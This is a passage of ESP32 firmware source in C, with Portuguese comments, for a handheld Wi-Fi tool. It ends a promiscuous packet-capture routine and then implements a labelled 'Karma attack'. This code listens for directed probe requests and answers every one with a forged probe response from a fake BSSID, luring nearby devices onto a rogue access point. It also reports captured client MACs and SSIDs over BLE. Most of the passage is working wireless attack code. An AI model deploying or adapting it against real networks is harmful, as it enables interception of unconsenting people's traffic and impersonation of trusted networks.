    if (ctx->filter & SNIFF_PCAP_FILTER_DATA) hw_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
    if (ctx->filter & SNIFF_PCAP_FILTER_CTRL) hw_mask |= WIFI_PROMIS_FILTER_MASK_CTRL;
    wifi_promiscuous_filter_t filter = { .filter_mask = hw_mask };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_pcap_done(0, 0, 0, 2);
        goto cleanup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_pcap);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    while (!s_stop && esp_timer_get_time() < deadline_us) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_promiscuous(false);

    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_pcap_done(s_pcap_emitted, s_pcap_dropped, elapsed, 0);
    ESP_LOGI(TAG, "pcap done: emitted=%u dropped=%u in %u ms",
             (unsigned)s_pcap_emitted, (unsigned)s_pcap_dropped,
             (unsigned)elapsed);

cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_pcap_start(uint8_t channel, uint8_t filter,
                                 const uint8_t *bssid,
                                 uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if ((filter & SNIFF_PCAP_FILTER_ALL) == 0) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0)   duration_sec = 60;
    if (duration_sec > 300)  duration_sec = 300;

    pcap_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    ctx->channel = channel;
    ctx->filter = filter & SNIFF_PCAP_FILTER_ALL;
    ctx->duration_sec = duration_sec;
    if (bssid) {
        memcpy(ctx->bssid, bssid, 6);
        ctx->has_bssid = true;
    }

    s_mode = SNIFF_MODE_PCAP;
    s_stop = false;
    if (xTaskCreate(pcap_task, "pcap_stream", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "pcap_start: ch=%u filter=0x%02x bssid=%s dur=%us",
             channel, filter, ctx->has_bssid ? "yes" : "no",
             (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_pcap_stop(void)
{
    if (s_mode != SNIFF_MODE_PCAP) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// Karma attack — responde a probe requests com probe response forjado
// ----------------------------------------------------------------------

// Probe Response template (header 24B + body fixo 12B = 36B fixo, mesmo
// shape do beacon mas com FC subtype=0x5).
//   FC: 0x50 0x00 (type=Mgmt, subtype=ProbeResp)
//   addr1: dest = source MAC do probe req (preenchido em runtime)
//   addr2: source = nosso BSSID fake (preenchido)
//   addr3: BSSID = nosso BSSID fake
static const uint8_t s_probe_resp_head[36] = {
    0x50, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr1: client (preenchido)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr2: BSSID (preenchido)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // addr3: BSSID (preenchido)
    0x00, 0x00,                                  // sequence
    0, 0, 0, 0, 0, 0, 0, 0,                      // timestamp
    0x64, 0x00,                                  // beacon interval 100 TU
    0x21, 0x04,                                  // capability: ESS + Short Slot
};

#define KARMA_MAX_DEDUP   128
#define KARMA_SSID_MAX    32

typedef struct {
    uint8_t mac[6];
    uint8_t ssid_len;
    char    ssid[KARMA_SSID_MAX];
} karma_seen_t;

typedef struct {
    uint8_t  channel;
    uint16_t duration_sec;
} karma_ctx_t;

static karma_seen_t *s_karma_seen = NULL;
static volatile size_t s_karma_seen_count = 0;
static volatile uint16_t s_karma_hits = 0;
static volatile uint16_t s_karma_unique_clients = 0;
static volatile uint16_t s_karma_unique_ssids = 0;

static void karma_make_bssid(uint8_t out[6], const char *ssid, uint8_t ssid_len)
{
    uint32_t h = 2166136261u;
    for (uint8_t i = 0; i < ssid_len; i++) {
        h ^= (uint8_t)ssid[i];
        h *= 16777619u;
    }
    out[0] = 0x02;
    out[1] = (uint8_t)((h >> 24) & 0xFF);
    out[2] = (uint8_t)((h >> 16) & 0xFF);
    out[3] = (uint8_t)((h >> 8) & 0xFF);
    out[4] = (uint8_t)(h & 0xFF);
    out[5] = (uint8_t)(ssid_len & 0xFF);
}

// Verifica se (mac, ssid) já visto. Se não, adiciona e retorna true.
// Também atualiza contadores de unique clients/ssids.
static bool karma_track_unique(const uint8_t mac[6], const uint8_t *ssid,
                                uint8_t ssid_len)
{
    bool mac_seen = false;
    bool ssid_seen = false;
    bool pair_seen = false;
    for (size_t i = 0; i < s_karma_seen_count; i++) {
        if (memcmp(s_karma_seen[i].mac, mac, 6) == 0) mac_seen = true;
        if (s_karma_seen[i].ssid_len == ssid_len &&
            memcmp(s_karma_seen[i].ssid, ssid, ssid_len) == 0) ssid_seen = true;
        if (mac_seen && ssid_seen &&
            memcmp(s_karma_seen[i].mac, mac, 6) == 0 &&
            s_karma_seen[i].ssid_len == ssid_len &&
            memcmp(s_karma_seen[i].ssid, ssid, ssid_len) == 0) {
            pair_seen = true;
        }
    }
    if (pair_seen) return false;
    if (s_karma_seen_count >= KARMA_MAX_DEDUP) return false; // limite

    memcpy(s_karma_seen[s_karma_seen_count].mac, mac, 6);
    s_karma_seen[s_karma_seen_count].ssid_len = ssid_len;
    if (ssid_len) memcpy(s_karma_seen[s_karma_seen_count].ssid, ssid, ssid_len);
    s_karma_seen_count++;

    if (!mac_seen) s_karma_unique_clients++;
    if (!ssid_seen) s_karma_unique_ssids++;
    return true;
}

static void emit_karma_hit(const uint8_t mac[6], const uint8_t *ssid,
                            uint8_t ssid_len)
{
    uint8_t payload[7 + KARMA_SSID_MAX];
    memcpy(&payload[0], mac, 6);
    payload[6] = ssid_len;
    if (ssid_len) memcpy(&payload[7], ssid, ssid_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_KARMA_HIT, s_seq++,
                           payload, 7 + ssid_len);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_karma_done(uint16_t hits, uint16_t clients, uint16_t ssids,
                             uint32_t elapsed_ms, uint8_t status)
{
    uint8_t payload[11];
    payload[0]  = (uint8_t)(hits >> 8);
    payload[1]  = (uint8_t)(hits & 0xFF);
    payload[2]  = (uint8_t)(clients >> 8);
    payload[3]  = (uint8_t)(clients & 0xFF);
    payload[4]  = (uint8_t)(ssids >> 8);
    payload[5]  = (uint8_t)(ssids & 0xFF);
    payload[6]  = (uint8_t)(elapsed_ms >> 24);
    payload[7]  = (uint8_t)(elapsed_ms >> 16);
    payload[8]  = (uint8_t)(elapsed_ms >> 8);
    payload[9]  = (uint8_t)(elapsed_ms & 0xFF);
    payload[10] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_KARMA_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

// Forja e envia probe response pra o cliente que mandou o probe req.
static void send_probe_response(const uint8_t client_mac[6],
                                 const uint8_t *ssid, uint8_t ssid_len,
                                 uint8_t channel)
{
    uint8_t bssid[6];
    karma_make_bssid(bssid, (const char *)ssid, ssid_len);

    // header(36) + ssid(2+32) + rates(2+4) + DS(2+1) + ERP(2+1) + ExtRates(2+4)
    uint8_t frame[36 + 34 + 6 + 3 + 3 + 6];
    size_t off = 0;

    memcpy(&frame[off], s_probe_resp_head, sizeof(s_probe_resp_head));
    memcpy(&frame[4],  client_mac, 6);   // addr1: dest = client
    memcpy(&frame[10], bssid,      6);   // addr2: source = BSSID
    memcpy(&frame[16], bssid,      6);   // addr3: BSSID
    off += sizeof(s_probe_resp_head);

    // SSID IE
    frame[off++] = 0x00;
    frame[off++] = ssid_len;
    if (ssid_len) memcpy(&frame[off], ssid, ssid_len);
    off += ssid_len;

    // Supported Rates
    frame[off++] = 0x01; frame[off++] = 0x04;
    frame[off++] = 0x82; frame[off++] = 0x84; frame[off++] = 0x8B; frame[off++] = 0x96;

    // DS Parameter
    frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = channel;

    // ERP IE
    frame[off++] = 0x2A; frame[off++] = 0x01; frame[off++] = 0x00;

    // Extended Supported Rates
    frame[off++] = 0x32; frame[off++] = 0x04;
    frame[off++] = 0x0C; frame[off++] = 0x12; frame[off++] = 0x18; frame[off++] = 0x60;

    esp_wifi_80211_tx(WIFI_IF_STA, frame, off, false);
}

static volatile uint8_t s_karma_channel = 0;

static void promisc_cb_karma(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 4) return;
    if (p[0] != 0x40) return; // probe request

    const uint8_t *src = &p[10];
    const uint8_t *ies = &p[24];
    uint16_t ies_len = len - 24 - 4;
    if (ies_len < 2) return;
    if (ies[0] != 0x00) return;
    uint8_t ssid_len = ies[1];
    if (ssid_len == 0) return;       // só direcionados
    if (ssid_len > KARMA_SSID_MAX) ssid_len = KARMA_SSID_MAX;
    if (2 + ssid_len > ies_len) return;
    const uint8_t *ssid = &ies[2];

    // Sempre responde (KARMA agressivo); dedup só pra controlar quantos
    // hits novos emitir via TLV.
    send_probe_response(src, ssid, ssid_len, s_karma_channel);
    s_karma_hits++;

    if (karma_track_unique(src, ssid, ssid_len)) {
        emit_karma_hit(src, ssid, ssid_len);
    }
}

static void karma_task(void *arg)
{
    karma_ctx_t *ctx = (karma_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    s_karma_seen = calloc(KARMA_MAX_DEDUP, sizeof(karma_seen_t));
    if (!s_karma_seen) {
        emit_karma_done(0, 0, 0, 0, 2);
        goto cleanup;
    }
    s_karma_seen_count = 0;
    s_karma_hits = 0;
    s_karma_unique_clients = 0;
    s_karma_unique_ssids = 0;
    s_karma_channel = ctx->channel;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_karma_done(0, 0, 0, 0, 2);
        goto cleanup_dedup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_karma);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    while (!s_stop && esp_timer_get_time() < deadline_us) {
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    esp_wifi_set_promiscuous(false);

    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_karma_done(s_karma_hits, s_karma_unique_clients,
                    s_karma_unique_ssids, elapsed, 0);
    ESP_LOGI(TAG, "karma done: %u hits, %u clients, %u ssids in %u ms",
             (unsigned)s_karma_hits, (unsigned)s_karma_unique_clients,
             (unsigned)s_karma_unique_ssids, (unsigned)elapsed);

cleanup_dedup:
    free(s_karma_seen);
    s_karma_seen = NULL;
cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_karma_start(uint8_t channel, uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0)   duration_sec = 60;
    if (duration_sec > 300)  duration_sec = 300;

    karma_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    ctx->channel = channel;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_KARMA;
    s_stop = false;
    if (xTaskCreate(karma_task, "karma", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "karma started on ch=%u for %us",
             channel, (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_karma_stop(void)
{
    if (s_mode != SNIFF_MODE_KARMA) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}
